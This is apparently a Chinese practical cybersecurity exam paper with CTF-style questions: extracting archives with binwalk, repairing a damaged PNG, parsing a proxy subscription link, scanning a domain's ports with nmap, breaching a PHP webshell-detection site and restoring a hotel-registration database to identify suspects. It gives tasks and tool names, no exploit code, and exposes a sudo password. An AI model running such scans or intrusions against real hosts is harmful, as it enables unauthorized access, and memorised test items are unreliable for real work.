网安实操模拟题 - 第七次测试考卷

一、(4分)

请获取当前q1文件夹下的flag

二、(5+8分)

某非法传播邪教团伙为躲避网络巡查，采用损坏PNG头并且二次加密的方式传输文件（本题提示，不会将题目复制到虚拟机的同学可以右键复制题目链接，然后在Linux虚拟机中使用wget+对应链接，即可下载本题对应文件至虚拟机）

  1. 根据侦察员初步判断，该压缩包密码藏于压缩包文件尾中，请使用Linux的binwalk工具对其分离，并回答该压缩包密码(binwalk安装方法：打开内置的虚拟机，输入命令sudo apt install binwalk，然后输入密码jssongsong即可)

  2. 请修复损坏的PNG文件，回答PNG文件的内容（所有压缩包请使用右键的7ZIP进行打开操作，勿使用Windows自带压缩工具）

三、（8分）

计算100个txt中第158个小的数字

四、（4+8分）

根据我国法律，公民不得在未报备的情况下私自使用翻墙工具浏览境外网站。目前我侦察员接报一线索，一嫌疑人持续为境外反华媒体喂料，经初步侦察，获取到嫌疑人网盘备份的翻墙工具配置文件

  1. 请解析出该嫌疑人在哪个网站订阅的翻墙节点，回答该订阅的完整链接，答案格式（https://testlink.xyz/a=1）

  2. 对jssongsong.cn的12000~13000端口号间展开扫描，找到某端口部署的鹰眼网络追踪系统，使用该系统定位嫌疑人ip（使用Linux的nmap工具，已内置，如未内置请使用sudo apt install nmap命令）

五、（6分）

对网站开展工作，获取flag变量的值

六、（8分）

随着网络安全不断发展，各种木马检测工具层出不穷，请对华夏国网络安全部第一研究所的在线PHP木马检测网站进行安全检查，获取q6文件夹下的flag

七、(6+10分)

治安总队通过主动进攻挖掘一关键情报，发现某案件全国在逃主犯于2025年有入住记录，现将案件移交于你，请恢复该省治安旅馆管理系统的数据库，进一步研判

  1. 根据嫌疑人画像，其喜欢住高价酒店，请先筛选出数据库内2025年酒店订单金额超过900元的订单数量

  2. 根据从犯欧阳杰笔录，主犯曾与从犯欧阳杰于2025年有同一酒店同一时间入住记录，请回答主犯姓名

八、(8分)
